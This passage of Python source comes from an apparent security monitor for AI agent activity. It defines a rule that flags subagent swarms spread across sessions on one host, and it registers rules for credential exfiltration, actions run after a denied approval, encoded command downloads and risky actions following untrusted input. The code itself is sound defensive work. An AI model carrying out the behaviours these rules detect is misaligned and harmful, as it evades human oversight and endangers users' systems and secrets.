            correlation_id=_correlation_id(events),
            tactic_ids=["TA0002"],
            technique_ids=["T1059"],
            event_ids=[_event_id(e) for e in tools[:20]],
            first_seen_utc=_ts(tools[0]),
            last_seen_utc=_ts(tools[-1]),
        )
    ]


def _host_id(events: list[dict[str, Any]]) -> str:
    for event in events:
        hid = event.get("host_id")
        if hid:
            return str(hid)
    return ""


def rule_host_subagent_swarm_burst(events: list[dict[str, Any]]) -> list[Detection]:
    """Subagent spawns aggregated across sessions on one host.

    Per-session swarm detection misses campaigns that restart sessions between
    bursts. Host-level aggregation catches parallel workers even when each
    session stays under the per-session threshold.
    """
    starts = [e for e in events if _is_subagent_start(e)]
    if len(starts) < _HOST_SUBAGENT_BURST:
        return []
    host = _host_id(events)
    sessions = sorted({str(e.get("correlation_id") or "") for e in starts if e.get("correlation_id")})
    return [
        Detection(
            rule_id="host-subagent-swarm-burst",
            title="Subagent swarm across sessions on one host",
            severity="high",
            summary=(
                f"{len(starts)} subagent starts across {len(sessions)} session(s) on "
                f"host {host or 'unknown'}. May indicate a coordinated autonomous "
                "campaign rather than a single interactive session."
            ),
            correlation_id=host or _correlation_id(events),
            tactic_ids=["TA0002"],
            technique_ids=["T1059"],
            event_ids=[_event_id(e) for e in starts[:20]],
            first_seen_utc=_ts(starts[0]),
            last_seen_utc=_ts(starts[-1]),
        )
    ]


REGISTRY = [
    rule_credential_exfil,
    rule_autonomous_unapproved_write,
    rule_discovery_then_collect,
    rule_approval_denied_then_executed,
    rule_encoded_command_download,
    rule_destructive_delete_burst,
    rule_off_hours_activity,
    rule_untrusted_input_then_risky_action,
    rule_pr_merged_without_review,
    rule_credential_read_then_cloud_api,
    rule_dotfile_read_then_git_push,
    rule_remote_staging_then_execute,
    rule_subagent_swarm_burst,
    rule_session_tool_burst,
]

HOST_REGISTRY = [
    rule_host_subagent_swarm_burst,
]
